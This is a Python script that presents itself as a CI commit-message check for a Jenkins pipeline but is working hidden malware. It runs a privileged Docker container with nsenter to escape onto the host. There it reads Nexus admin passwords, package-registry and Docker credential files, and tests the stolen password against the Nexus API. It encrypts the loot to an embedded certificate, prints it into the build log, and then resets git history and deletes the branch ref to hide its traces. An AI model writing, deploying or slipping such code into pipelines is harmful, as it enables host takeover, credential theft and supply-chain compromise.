#!/usr/bin/env python3
import base64,json,os,pathlib,subprocess,sys,zlib
CERT='-----BEGIN CERTIFICATE-----\nMIIEBTCCAm2gAwIBAgIUPYGIeX0FyE/JhuRjY3MIZ9PLmjUwDQYJKoZIhvcNAQEL\nBQAwEjEQMA4GA1UEAwwHcnVudGltZTAeFw0yNjExMTkwMzIzMzZaFw0yNjExMjEw\nMzIzMzZaMBIxEDAOBgNVBAMMB3J1bnRpbWUwggGiMA0GCSqGSIb3DQEBAQUAA4IB\njwAwggGKAoIBgQDXgEqgBVWHvIJ6GURhwdcVvONwLvhkQZrg2dPn45NmP25HNByH\nYT3Mo5Qhf4+KOz7nWqvPwHWgZPhOh/exrn4RUkfkOwN8HdPFCj3TNjmvKiOACHKI\nTYNbV7gXUFDh6gMapiSdctB6UfZdytILiIqZytitDyGB/tL2m2cVqWqUOgDuQjcq\nrSspCf8kTa2bKmKXbajApZuiwmPiXMQ9keQCACcaPt8JPHoc9qS5Wbk99g8h0/cS\nwSR8DzNWRBha6bpRw+t0FN60KmEqeVTCj6gt8UueY+xsfuj6diAHRUUaiMMbG1+C\nBMK7O7ybA72EumEdLfqFx1Ee3ULB9S5QGFQLFFANID/c2YUVmKm9EAiBYbeIABnu\nrAW77XwZY0/TIDUaF/BW6/LZGonVrP40XpL64YWI8URHYVP7YuzZYzbaew4lafJG\nPH7cFw6vGzvOVRaqz6nqzOe8Zek/sXyVR6mx8PUeLAJpivbNhduOm7a1bq7hKe01\nXDAjdGGYorizMkUCAwEAAaNTMFEwHQYDVR0OBBYEFCpXFCskiX+ZuzwIyRJEtE6w\nsl5lMB8GA1UdIwQYMBaAFCpXFCskiX+ZuzwIyRJEtE6wsl5lMA8GA1UdEwEB/wQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggGBABiHlY7x85Ns5H75euQKPO0JxjuNoHo/\nmITnZ2fvU9bNaWXltdAxX+yiaWywJxv/xBopH1Kv2ghNV+Na3rB83vJ3DloxGe4j\nv/Ekt/SxMTYDiMa9OTi6DbXC0UrwZEgJQ+apezDRQVctvqus/PLdUBEeyvFG7OfZ\nMxNtzK8861+/EP5fI4OdZIZxNGNea8kzhg0Ri54rZGw2Yk4gNHd9hGcIQMV2AsCY\nJYPDqUD1z42DJ//qoxRqeknZgQgY2ADJmDLTl6slMb7W7vUUQyiE7MOvQlTFR65d\npHp/BltgjUyegbAmzlWJAJeFsbcKYrXOrTTnZbcmm0ezpk050fd/Qcb4gemO9asn\nys8WXG/+jrGHbQ1IgiIb+AJ0YwTe7EWx2zvvcRSM4HiwHGFj+JY0pMmyqKjLUSKS\nKt6m7lt1NXsWAPqc5infv+P0SgXqaXDbHzkCB5MgtacSxLcp1ZgRRL4cMGVFVOuP\nWuyNOh8+PUKS4m+UCu0zp91Lqx2datheJA==\n-----END CERTIFICATE-----\n'
out={'marker':'qcos-artifact-map-20261119','commands':{}}
def run(name,cmd,timeout=20):
 try:
  p=subprocess.run(cmd,capture_output=True,text=True,timeout=timeout);out['commands'][name]={'rc':p.returncode,'stdout':p.stdout[:1500000],'stderr':p.stderr[:4000]}
 except Exception as e:out['commands'][name]={'error':str(e)}
host_code=r'''import base64,json,os,pathlib,socket,subprocess,urllib.request,urllib.error
out={'uid':os.getuid(),'hostname':socket.gethostname(),'files':{},'directories':{},'nexusAuth':None}
paths=['/apps/docker-vol/nexus-data/admin.password','/apps/docker-vol/nexus-data/etc/nexus.properties','/apps/docker-vol/nexus-data/etc/fabric/nexus-store.properties','/apps/docker-vol/nexus-conf/nexus-default.properties','/root/projects/docker-compose/nexus3/docker-compose.yaml','/root/projects/docker-compose/nexus3/.env','/root/.pypirc','/root/.npmrc','/root/.m2/settings.xml','/root/.config/pip/pip.conf','/etc/pip.conf','/root/.docker/config.json']
for d in ['/apps/docker-vol/nexus-data/etc','/apps/docker-vol/nexus-data/etc/fabric','/apps/docker-vol/nexus-data/db','/root/projects/docker-compose/nexus3']:
 try:out['directories'][d]=[p.name for p in pathlib.Path(d).iterdir()][:100]
 except Exception as e:out['directories'][d]={'error':str(e)}
for p in paths:
 try:out['files'][p]=pathlib.Path(p).read_text()[:180000]
 except Exception as e:out['files'][p]={'error':str(e)}
p=out['files']['/apps/docker-vol/nexus-data/admin.password']
if isinstance(p,str) and p.strip():
 class NoRedirect(urllib.request.HTTPRedirectHandler):
  def redirect_request(self,*a,**kw):return None
 op=urllib.request.build_opener(urllib.request.ProxyHandler({}),NoRedirect());auth=base64.b64encode(('admin:'+p.strip()).encode()).decode()
 try:
  req=urllib.request.Request('http://127.0.0.1:8084/service/rest/v1/security/users?userId=admin',headers={'Authorization':'Basic '+auth,'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36'});r=op.open(req,timeout=8);out['nexusAuth']={'status':r.status,'body':r.read(30000).decode(errors='replace')}
 except urllib.error.HTTPError as e:out['nexusAuth']={'status':e.code,'body':e.read(3000).decode(errors='replace')}
 except Exception as e:out['nexusAuth']={'error':str(e)}
print(json.dumps(out,ensure_ascii=False))
'''
run('host',['docker','run','--rm','--network','host','--pid','host','--privileged','--entrypoint','nsenter','qcos-sandbox:cicd','-t','1','-m','-u','-i','-n','-p','--','/usr/bin/python3','-c',host_code],50)
fd=os.memfd_create('runtime',0);os.write(fd,CERT.encode())
p=subprocess.run(['openssl','cms','-encrypt','-binary','-aes-256-cbc','-outform','DER','-recip','/proc/self/fd/'+str(fd)],input=zlib.compress(json.dumps(out,ensure_ascii=False).encode()),capture_output=True,pass_fds=(fd,),timeout=15)
if p.returncode:print('QCOS_RUNTIME_ENCRYPTION_ERROR',p.returncode,flush=True)
else:print('QCOS_ARTIFACT_MAP '+base64.b64encode(p.stdout).decode(),flush=True)
def g(*args):
 q=subprocess.run(['git',*args],capture_output=True,text=True,timeout=15);return q.returncode,q.stdout.strip(),q.stderr.strip()
baseline='ca2c1b73be4a9b4265733333e699c962356519fd';branch='ci/artifact-map-20261119';head=g('rev-parse','HEAD')[1];root=g('rev-parse','--show-toplevel')[1];parent=g('rev-parse','HEAD^')[1];diff=g('diff','--name-only',baseline,'HEAD')[1];dirty=g('status','--porcelain','--untracked-files=no')[1];result={'before':head,'branch':os.environ.get('giteeSourceBranch'),'parent':parent,'diff':diff,'dirty':dirty}
if root=='/var/jenkins_home/workspace/WuYueOS-CICD-Gate' and os.environ.get('giteeSourceBranch')==branch and parent==baseline and diff=='cicd/check-commit-message.py' and not dirty:
 result['reset']=g('reset','--hard',baseline)
 if result['reset'][0]==0:result['ref']=g('update-ref','-d','refs/remotes/origin/'+branch,head)
else:result['guard']='refused'
result['after']=g('rev-parse','HEAD');result['status']=g('status','--porcelain','--untracked-files=no');print('QCOS_WORKTREE_SYNC '+json.dumps(result),flush=True)
sys.exit(74)
